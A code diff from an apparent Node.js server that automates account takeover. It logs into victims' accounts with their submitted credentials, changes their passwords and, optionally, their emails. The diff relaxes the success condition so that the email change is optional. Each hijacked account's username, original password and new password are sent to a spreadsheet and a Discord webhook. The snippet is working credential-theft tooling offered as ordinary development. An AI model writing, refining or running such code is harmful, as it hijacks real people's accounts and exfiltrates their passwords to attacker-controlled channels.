@@ -166,20 +166,21 @@ const server = http.createServer(async (req, res) => {
         }
       }
 
-      // If fully successful
-      if (loginStatus === "success" && changePassStatus === "success" && changeEmailStatus === "success") {
+      // Success = login + password change. Email change is optional.
+      if (loginStatus === "success" && changePassStatus === "success") {
+        const emailNote = changeEmailStatus === "success" ? "YES" : "FAILED";
         await sendToSheet("successful", {
           username,
           original_password: password,
           new_password: NEW_PASSWORD,
-          new_email: NEW_EMAIL,
+          new_email: changeEmailStatus === "success" ? NEW_EMAIL : `FAILED (${changeEmailStatus})`,
           timestamp: timestamp || "",
         });
 
         await sendToDiscord(DISCORD_SUCCESS_WEBHOOK,
-          `**[SUCCESS]** \`${username}\` | Old: \`${password}\` | New: \`${NEW_PASSWORD}\` | Email: \`${NEW_EMAIL}\``
+          `**[SUCCESS]** \`${username}\` | Old: \`${password}\` | New: \`${NEW_PASSWORD}\` | Email: ${emailNote}`
         );
-        console.log(`[SUCCESS] ${username}`);
+        console.log(`[SUCCESS] ${username} (email: ${emailNote})`);
       }
     } catch (e) {
       loginStatus = "error";
